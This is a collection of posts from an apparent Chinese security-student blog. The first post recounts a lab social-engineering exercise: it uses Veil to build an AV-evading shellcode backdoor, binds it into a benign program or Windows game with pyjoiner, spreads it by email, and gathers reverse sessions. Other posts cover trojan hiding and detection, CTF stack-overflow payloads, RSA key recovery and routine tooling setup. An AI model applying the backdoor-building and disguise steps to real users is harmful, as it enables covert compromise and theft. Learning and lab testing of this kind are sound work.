在本次前期的渗透过程中，我们尝试的29号payloadpython/shellcode_inject/aes_encrypt.py的免杀效果最好，因此在本次的社工，通过邮件、布谷鸟扩散的后门木马就使用这个。在实际的测试当中，发现在win10中的效果也是不错的。 下面贴出生成命令： 1234567891011121314151617# 打开veilveil# 选择evasionuse 1# 选择29号payloaduse 29# 使用python加密set USE_PYTHON Y# 开始生成generate# 选择msfvenomuse 2 之后一路回车，中间填写输出文件名、监听IP地址、监听端口。 pyjoiner是一个github上的开源项目，地址为 有两个版本，一个是32位kali的版本，另一个是win下的带图形界面的版本。 在这里我们选择win下的版本。 windows版本：windows 10 python版本： 3.4.4 pyinstaller版本： 3.3.1 以上是本次pyjoiner的运行环境。 down下来pyjoiner后，打开文件夹，在该位置下打开cmd运行python pyJoiner.py，出现图形化界面。 傻瓜式操作选择被捆绑程序和后门程序。这里我们选取了自写的一个qt程序和veil生成的后门。 运行后： 发现在后台启动了两个进程，分别为被捆绑的正常软件和后门程序。实现了对后门的隐藏。 之后想到了更加好的隐藏办法，将后门捆绑在windows自带的小游戏下，这样的隐藏效果会更好。 开始攻击将事先准备好的小蘑菇.exe通过布谷鸟和邮件的方式进行在内网下的传播，并在kali上开启监听。 最后的效果很好，反弹回了一堆session，其中挑几个，查看其中flag和getuid。 总结在这次的社工中，主要的目的针对了对传播木马的伪造效果，对社工的具体的利用方式还有待加强，没有达到一个正真的外部人员对一个内网用户真实的社工状态，这可能跟我们本来就是内部人员有关吧:joy:。希望各位大佬能够给予一些建议:innocent:。"},{"title":"木马概述","date":"05/02/2020","path":"2020/02/05/20200205214405/","text":"0x00 木马概念这篇主要讲的是木马的隐藏和发现技术。偏综述，没有具体的技术。 名词解释： 名词 解释 木马 隐藏在正常程序中的有特殊功能的恶意代码，如破坏删除文件、发送密码、记录键盘和攻击Dos等特殊功能的后门程序。 病毒 编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。具有传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性。 木马是病毒的一种，但并没有自我传播的能力，常用来当作后门。 0x01 木马的攻击原理木马的运行机制是由木马程序和控制端程序共同组成的，采用C/S架构。 木马程序运行在被控端（目标靶机）上，作为服务端，为攻击者提供服务。 控制端程序运行在攻击机上，作为客户端。用来接受靶机所提供的服务，如屏幕快照、键盘记录、命令行交互界面。 在实际的应用场景中，可以理解为是多个服务端（肉鸡），受控于一个客户端（攻击者），多个服务端对一个客户提供不同的服务。 过程： 配置木马，设置木马信息反馈方式。 传播木马，将设置好的木马扩散传播。方法有：网站挂马、电子邮件传播。 运行木马，更具设置适时运行。 信息反馈，电子邮件是木马进行反馈的常用渠道。 建立连接。 远程控制。 0x02 隐藏技术可分为三类： 加载时隐藏，也可理解为上传过程中的隐藏。 存储时隐藏，静态免杀。 运行时隐藏，动态免杀。 这里主要讲两种方法，分别是进程列表欺骗和篡改系统中的动态链接库。 进程列表欺骗主要是利用hook技术，在对特定的系统事件进行hook，当被hook的事件发生后，对该事件hook的程序就会第一时间，在系统响应之前作出响应，对结果进行了修改。 篡改系统中的动态连接库是改变计算机注册表中的键值对，一次来更改加载的动态链接库。 在之前的学习中，还有一种在windows下的隐藏技术，NTFS文件流。 免杀实践：之前曾经在一次实战中，通过veil和pyjoiner实现免杀（细节问题还需优化，重在思想）。可见记一次小小的社工行动。 0x03 发现技术： 查看隐藏文件及扩展名，是否存在多扩展命的进程。 检查系统文件是否都处在正常的系统文件夹中（如存在多个同名系统文件）。 查看端口占用情况。 通过工具的发现技术： Autoruns：查看自启动项，判断自启动程序中是否存在木马。 狙剑：找出使用hook修改过系统服务描述符表的函数。 Fport：查看进程与端口。 检查注册表：常用knowDLLs缓存常用DLL，检查是否有新增或可疑的键值。 0x04 基于github的木马github3.py库的学习学习木马基于github的命令和控制，主要是对github API的学习，书中的部分代码无法运行，在参考github API的参考文档后，对代码进行调试运行，并将加密后的记录上传到仓库trojan下的data。 在熟练github API的运用之后，可以在丰富modules模块，为木马添加更多的功能。"},{"title":"mac重新下载xcode命令行工具","date":"04/02/2020","path":"2020/02/04/20200204205612/","text":"0x00 遇到问题在使用npm install时报错 1gyp: No Xcode or CLT version detected! 0x01 重新下载安装xcode命令行12rm -rf /Library/Developer/CommandLineTools xcode-select --install 若权限不够，加sudo。"},{"title":"python下json库的使用","date":"04/02/2020","path":"2020/02/04/20200204113323/","text":"0x00 json介绍JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于人阅读和编写。 JSON常用做网站异步请求的数据交换，网站异步请求，对服务器进行请求后，服务端进行处理后，将处理后的结果通过JSON格式传回给客户，客户端经过解析，表现出来。 在一些程序的编写过程中，通常也通过JSON来进行配置数据的存储，以此方便程序的编写。 0x01 python下的json在python中有一个json的库，提供了对json文件的使用。 要使用json库，需要在开始导入json库：import json。 0x02 json使用导入json库之后，最常见的两个函数是： 函数 描述 json.dumps 将python对象解析为json Json.loads 将json解析为python对象 这两个方法将python对象和json字符串进行相互的转化。在读取json文件后，通过loads解析为python对象，能够使用对象的方法。在处理完数据之后，将python对象解析为json字符串，方便存储。 python对象类型和json类型转化对照表 python json dict object list, tuple array str, unicode string int, long, float number True true False false None null"},{"title":"git clone慢的解决办法","date":"03/02/2020","path":"2020/02/03/20200203171030/","text":"0x00 git clone慢的问题因为墙的原因，有些时候在git clone下载一些github上的库的时候会因为延迟太高，速度太慢而导致了下载失败。 0x01 解决办法为git添加代理，前提条件是你在代理能够访问外网，并且在本地监听了socks的端口。 12git config --global http.proxy socks5h://127.0.0.1:1081git config --global https.proxy socks5h://127.0.0.1:1081 在我的电脑上，socks5监听在1081端口上。 上面的办法只在通过http和https进行clone时生效。"},{"title":"linux虚拟机硬盘不够导致apt无法使用的解决方法","date":"21/01/2020","path":"2020/01/21/20200121212937/","text":"0x00 遇到问题在安装虚拟机时分配了20G的空间，但在使用的过程中，20G的空间被占满，在apt安装软件时出现了错误。提示/var/cache/apt/archives空间太小，导致了无法安装软件。 0x01 解决方法 首先关闭虚拟机 清除所有的快照 在虚拟机软件中调整分配给该虚拟机的硬盘大小 打开虚拟机 查看磁盘 fdisk -l发现新添加的磁盘/dev/sda3。 进入磁盘的菜单项，增加分区。 fdisk /dev/sda3 在磁盘管理的菜单中，n进行添加分区，选择e添加扩展分区，w将更改写入磁盘。 格式化分区 mkfs.ext3 /dev/sda3 在根目录下创建新的目录，并将新建分区挂载该目录下 mkdir cn mount /dev/sda3 /cn 查看挂载情况 df -h 发现新增加的磁盘已经挂在在了/cn下。 在新的目录下创建一个目录，然后把/var/cache/apt/archives换成指向那个目录的软连接 mkdir -p /cn/debs/partial rm -rf /var/cache/apt/archives ln -s /cn/debs /var/cache/apt/archives 0x02 总结经过以上的操作可以解决磁盘空间不够导致的apt安装时提示空闲空间不够的问题。 该解决方法必须在root权限下进行操作。 目前对Linux的磁盘管理方面的知识还不是很完善，之后加强对linux磁盘管理的学习。"},{"title":"记一次渗透测试","date":"16/01/2020","path":"2020/01/16/20200116090736/","text":"0x00 开始在临近过年，实验室迎来了一项渗透的任务，是对实验室的内网环境进行一次渗透测试，以收集足够的数据进行研究。 这是个人第一次进行渗透测试，并在测试中间进行实验室环境的维护，觉得很有纪念的价值，顾总结出这次的小记。 0x01 环境说明"},{"title":"解决Veil—Evasion安装中git clone导致失败的问题","date":"11/01/2020","path":"2020/01/11/20200111193201/","text":"解决Veil—Evasion安装中git clone导致失败的问题0x00 原因因为git clone在国内下载过慢的原因，在Veil安装时，下载依赖不成功导致安装失败。 因此，找到了一下详细的办法。 0x01 kali下安装Veilkali下安装只需要一行命令。 apt-get install veil-evasion 0x02 下载依赖首先在以下地址下载VeilDependencies1.zip和VeilDependencies2.zip。 下载地址 下载完成后将两个安装包分别都解压。解压后为10个文件。 在/var/lib/veil/下创建文件夹setup-dependencies，并将以上文件拷贝到该文件夹下。 若以上方法还出现问题，则在siteup-dependencies下再创建文件夹VeilDenpendencies，并将以上文件复制到该文件夹下再试。 0x02 更改setup.sh到路径/usr/share/veil/config/下通过vim打开setup.sh，在248行找到一下代码，将其注释。 1234echo -e &quot; [*] $&#123;YELLOW&#125;Empty folder... git cloning$&#123;RESET&#125;\\n&quot;sudo mkdir -p &quot;$&#123;dependenciesdir&#125;&quot;sudo rm -rf &quot;$&#123;dependenciesdir&#125;&quot;sudo git clone https://github.com/Veil-Framework/VeilDependencies.git &quot;$&#123;dependenciesdir&#125;&quot; 并在这几行代码向上16行左右的位置找到rm -rf &quot;$&#123;dependenciesdir&#125;&quot;，并将其注释。 12[ &quot;$&#123;force&#125;&quot; == &quot;true&quot; ] # &amp;&amp; rm -rf &quot;$&#123;dependenciesdir&#125;&quot; 0x03 执行安装./setup.sh --force --silent 看到上图，表示安装成功，唯一的错误是因为手动下载依赖导致，无关紧要。"},{"title":"danted-server实现双网卡中内网的访问","date":"08/01/2020","path":"2020/01/08/20200108215508/","text":"danted-server实现双网卡中内网的访问0x00 背景靶场环境整个靶场环境在内网环境下。 靶机：192.168.2.244 2网段下只有一台主机，244双网卡，另一网卡接入互联网。 内网用户：192.168.3.* 3网段用户通过代理，经过244访问互联网 攻击环境（无Internet访问）：192.168.4.* 攻击机在4网段，能够针对2网段进行渗透攻击 攻击环境（针对一台主机）在mac上安装kali虚拟机，因接入攻击网段无法访问互联网，因此虚拟机接入一个无线网卡。kali双网卡，vmware提供的nat虚拟网卡、无线网卡。 kali： ​ 192.168.4.78：访问靶机。 ​ 172.16.34.148：与物理机进行通信。 0x01 为何利用danted-server主要原因是蚁剑之前已经安装在mac上，不想在kali上再装一遍。因此想通过socks5代理实现物理机蚁剑能够连接靶机webshell。 0x02 kali服务端配置安装danted-server 安装 1apt-get install danted-server 配置 创建用户。 12useradd superjpasswd superj 首先备份/etc/danted.conf。 1rm /etc/danted.conf /etc/danted.conf_old 创建/etc/danted.conf，并写入。 1vim /etc/danted.conf 12345678910111213141516171819202122logoutput: /var/log/danted.loginternal: 172.16.34.148(与物理机进行通信的网卡) port = 1080external: 192.168.4.78(与靶机进行通信的网卡)method: username #noneuser.privileged: rootuser.notprivileged: superj(自己创建的用户)user.libwrap: nobodyclient pass &#123;from: 0.0.0.0/0 to: 0.0.0.0/0log: connect disconnect&#125;pass &#123; from: 0.0.0.0/0 to: 0.0.0.0/0 command: bind connect udpassociate log: error # connect disconnect iooperation method: username&#125;block &#123;from: 0.0.0.0/0 to: 0.0.0.0/0log: connect error&#125; 启动danted服务。 1/etc/init.d/danted start 0x03 蚁剑配置蚁剑配置代理。 0x04 结果成功打开webshell。 0x05 思考通过这次的配置，感觉可以在靶机上也通过这次的代理方式实现对3网段的攻击。"},{"title":"pyenv的使用","date":"06/01/2020","path":"2020/01/06/20200106210355/","text":"0x00 mac下python首先，在mac的os x环境下，本身自带的python2的环境。目录在： 1/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125; 通常我们一般通过brew来安装python。 12brew install pythonbrew install python3 目录分别为： 12/usr/local/Cellar/python/3.7.3/Frameworks/Python.framework/Versions/3.7/bin:$&#123;PATH&#125;/usr/local/Cellar/python@2/2.7.16/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125; 在安装了python3，之后通常我们使用python打开python2，使用python3来使用python3，用pip和pip3来进行第三方库的安装，但是这种方式下，对于第三方库的安装和python本身的使用比较麻烦，环境问题会很麻烦。这个时候，我们就可以使用pyenv来管理我们的python环境，方便又直观。 0x01 pyenv介绍​ python多版本管理工具，python环境路径直观清晰，管理方便。 安装pyenv​ 通过brew进行安装 1brew install pyenv ​ 在安装之后，会提示将以下信息复制到~/.zshrc或~/.bash_profile下，具体写入哪个文件，和你当前使用shell种类有关。 123export PATH=&quot;~/.pyenv/bin:$PATH&quot;eval &quot;$(pyenv init -)&quot;eval &quot;$(pyenv virtualenv-init -)&quot; ​ 执行命令source ~/.zshrc或source ~/.bash_profile式环境变量生效。 ​ 安装后，在当前用户的根目录下生成.pyenv目录，通过pyenv安装的python都在下面的目录下。 1~/.pyenv/versions/ pvenv使用1234567891011121314151617181920# 查看可以安装的python版本pvenv install -l# 安装指定版本pyenv install 3.8.1# 设置全局python版本pyenv global 3.8.1# 设置当前目录版本pyenv local 3.8.1# 查看全局python版本pyenv global# 查看当前目录python版本pyenv local# 查看系统中安装的python版本，并提示当前使用的python版本pyenv version 使用python时，直接在终端输入python 会打开当前目录所设置的python版本的交互shell。"},{"title":"2019年度总结","date":"06/01/2020","path":"2020/01/06/20200106195622/","text":"总结说来惭愧，本想着在2020年始，期末考完之后就总结一下，没想到今天才开始。 2019年对我自己来说应该是最特殊，最重要的一年了。 18年决定了考研，在图书馆呆了一年。每天就是图书馆，图书馆，图书馆的呆着，按着计划复习着每门功课。 复习着，复习着就到了考试的时候。和大部分人一样，两天转眼过去，脱离苦海。 因为考的本校的研，19年刚开始便和老师联系，开始去实验室。 从此，提前开始了研究生的生活。 说实在的，刚开始是真的没有习惯这种快节奏的生活。上半年每天懵懵懂懂的到实验室，虽然师兄给了自己一份学习路径，但当时的状态可能没整好，学的没有一点头绪，东摸摸，西摸摸，没有感到一点进步，天天到实验室摸鱼，学的特别的杂。中间学习python和信息收集的知识，完成了毕设，当时对信息收集技术的理解很浅显，作出来的东西现在看来，价值很低。仅此，没有感到一丝进步。到了暑假，同届的同学也都从不同的地方，来到了这个叫做中北的地方，有了小伙伴，学习的状态也来了，开始真正的进入了网络安全这个领域。 经过暑假和下半年的学习，最大的成就应该就是onenote中增加了15本笔记，几十页的内容。对渗透、内网、逆向等领域的知识有了一个系统的学习认识。然后就是之前纯粹看不懂的CTF题终于能够看懂，能做出来，在不看别人的wp也能够有了自己的想法，将它撸出来。 当然，现在仅仅是对安全这个领域有了简单的入门，不过，对于喜爱的行业来说，走出这一步，已经让我很开心了。 目标作为一个小白，在新的一年中，希望可以能多和安全届的大佬学习，不断的提升自己的安全技能。 在新的2020年，立下几个flag，希望2020年末不会被自己打脸，能把这份热爱，激情保持下去。 减肥，每天游泳1500，减到120斤。 练习CTF，将攻防世界的所有类型新手题刷完，pwn和reverse高手题都做到10道以上。 保证每周至少一篇的技术博客发布在CSDN。 日vulhub。 学习英语保证每天背诵单词。 打穿实验室环境。 提交自己的SRC。"},{"title":"RSA解密","date":"21/12/2019","path":"2019/12/21/20191221113323/","text":"RSA解密openssl rsa -pubin -text -modulus -in warmup pub.pem 可以解出e和N。 http://factordb.com/通过该网站，输入N，得到p和q。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# coding = utf-8def computeD(fn, e): (x, y, r) = extendedGCD(fn, e) # y maybe &lt; 0, so convert it if y &lt; 0: return fn + y return ydef extendedGCD(a, b): # a*xi + b*yi = ri if b == 0: return (1, 0, a) # a*x1 + b*y1 = a x1 = 1 y1 = 0 # a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a / b #ri = r(i-2) % r(i-1) r = a % b a = b b = r #xi = x(i-2) - q*x(i-1) x = x1 - q * x2 x1 = x2 x2 = x #yi = y(i-2) - q*y(i-1) y = y1 - q * y2 y1 = y2 y2 = y return(x1, y1, a)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239e = 65537n = p * qfn = (p - 1) * (q - 1)d = computeD(fn, e)print d 通过上面的脚本可以得到d。 12345678910111213141516171819202122# coding=utf-8import mathimport sysfrom Crypto import PublicKeyarsa = PublicKey.RSA.generate(1024)arsa.p = 275127860351348928173285174381581152299arsa.q = 319576316814478949870590164193048041239arsa.e = 65537arsa.n = arsa.p * arsa.qFn = long((arsa.p - 1) * (arsa.q - 1))i = 1while(True): x = (Fn * i) + 1 if(x % arsa.e == 0): arsa.d = x / arsa.e break i = i + 1with open(&#x27;private.pem&#x27;, &#x27;w&#x27;) as private: private.write(arsa.exportKey()) 在kali中，通过上面的脚本可以生成private.pem。 输入openssl进入工作空间，输入rsautl -decrypt -in flag.enc -inkey private.pem，可解出明文。"},{"title":"攻防世界PWN新手题——level2","date":"20/12/2019","path":"2019/12/20/20191220201041/","text":"level20x00首先通过file和checksec分析该题的附件。 判断该文件是32位的ELF文件，只开启了不可执行的保护。 0x01开始进行反汇编，用IDA 32位。 通过左侧的函数窗口发现，只有main、vulnerable_function可用，因此进行分析，两个函数如下图： 通过分析发现，在main函数中首先调用vulnerable_function，在vulnerable_function中的缓冲区大小为88h，而read函数能够写进缓冲区100h，因此存在栈溢出。 知道是栈溢出之后就需要找到溢出点：缓冲区大小加上ebp的4个字节后，就是返回地址的位置。 发现在ELF文件中存在字符串“/bin/sh”，而且在主函数中最后会再次调用一次system函数，因此判断可以返回最后一次调用的位置。因此构造payload。 1payload = &#x27;a&#x27; * 0x88 + &#x27;a&#x27; * 4 + p32(0x0804849e) + p32(0x0804a024) 最后的0x0804a024为/bin/sh的地址。 0x02最后的exp为： 0x03 最后获取到shell，cat flag得到flag。"},{"title":"攻防世界PWN（level0）","date":"18/12/2019","path":"2019/12/18/20191218221857/","text":"level00x00首先，进行通过file判断附件文件类型。 判断是ELF文件。这时就可以通过checksec判断文件的保护措施。 得到只开启了执行保护，地址随机化、栈保护都没有开启。 0x01开始IDA逆向分析。 在其中发现了main、vulnerable_function、callsystem函数逐个查看这三个函数。 发现该题中用到了write、read函数，google一下发现read函数是往内存里面写，而且发现大小为0x200大小，比0x80大的多，所以想到栈溢出，而且有callsystem函数（地址为0x400596）能够直接得到shell。 最终，确定了通过栈溢出执行callsystem从而得到shell。 0x02编写exp。 0x03得到flag。"},{"title":"v2ray的搭建过程","date":"22/11/2019","path":"2019/11/22/20191122004901/","text":"0x00 VPS首先，第一步，是需要一个墙外的VPS，可以从很多VPS商买到。 bandwagonhost.com vultr.com bandwagonhost需翻墙后才能访问，vultr可以支付宝付款。 还有其他很多VPS商可以购买，不限于上面两家。最好买日本、香港、新加坡的，线路近，延迟低。 推荐系统的版本是debian9+。 0x01 v2ray一键脚本用的是233boy的一键脚本，方便快捷。 1bash &lt;(curl -s -L https://git.io/v2ray.sh) 安装后按提示，安装、配置就可以了，傻瓜式的，很简单。 0x02 bbr一键脚本123wget -N --no-check-certificate &quot;https://raw.githubusercontent.com/chiakge/Linux-NetSpeed/master/tcp.sh&quot;chmod +x tcp.sh./tcp.sh 油管上发现的，油管主视频测评推荐BBR plus，亲测可以。 0x03 WS+TLSv2ray支持伪装成一个网站。当我们通过代理软件走vmess的代理的话，是翻墙的功能，当我们通过浏览器直接访问域名的话，会给我们返回伪装的网站。 话不多说，上配置。 域名解析首先购买一个域名，将域名解析到你的vps的ip地址上。 我是在阿里云上购买的域名： 在记录值填入你自己的VPS的IP地址，主机记录里填@。 之后就是在服务端的脚本中的配置。 服务端配置 选择2.修改v2ray配置。 选择2.修改v2ray传输协议。 选择4.WebSocket+TLS。 后面的修改跟着提示来就行了。 0x04 客户端最后就是各种客户端的下载。 Mac OX：v2rayX Windows：v2rayN ios：shadowrocket Android：自己找去😂"},{"title":"Hexo搭建博客后的问题","date":"14/09/2017","path":"2017/09/14/20170914223339/","text":"1.通过Hexo搭建博客的问题** 通过Hexo搭建好博客并发布到Git上之后，为了使博客更加方便和没观，一直在不停的优化它。但在优化的过程中遇到了很多的问题。 1.安装插件的问题 在优化博客的时候，经常会看到别人的博文上让下载插件来提高博客的方便性。我在优化的时候也下载过两次插件，但每次使用后都会发生错误，在Git Bash上输入hexo命令后显示无法找到hexo，让重新下载hexo，如下图。![hexobug][doge] 因此，在没有必要，没有学习好node.js的时候不要为了追求功能的多样而下载插件。 2.博客本地文件备份在Github上的问题 在使用的途中，因为各种各样的BUG，经常导致在本地无法运用hexo进行博文的更新和对博客的优化，从而需要重新搭建博客（因为目前的东西还比较少，能够从来的起，所以仅针对刚刚使用hexo的人来说），所以就在想有没有什么办法能够将本地的博文备份。 一开始想到了百度云盘，但因为云盘有不安全的地方（PS.通过www.panduoduo.net可以查找到云盘用户存放的文件），所以果断放弃，当然还是因为我这种爱搞的人当然不能用这么low的东西。因此，不断在网上找方法。 通过github来进行备份 1. 在Github下创建一个新的repository，取名为Hexo。(与本地的Hexo源码文件夹同名即可) 2. 进入本地的Hexo文件夹，执行以下命令创建仓库: git init 之后设置远程仓库的地址 git remote add origin git@github.com:smilexiamo/hexo.git 3. 每次更新完博文之后，将更新推送到github上 123git add .git commit -m &quot;添加hexo源码文件作为备份&quot;git push origin master 这样就完成了博客的备份 在新机上重新开始博客的更新 1. 在新机上，载好git、node.js后，创建blog文档，重新执行到hexo init之前的命令。 2. 创建Hexo文件文件夹执行 12 git init git clone &quot;git@github.com:overoptimus&#x2F;Hexo.git&quot; 123 将远程仓库拷贝到本地，这样就可以再次写博文了。 注意将仓库地址改为你自己的地址，不然你就拷到我的博客文件了。"}],"categories":[],"tags":[]}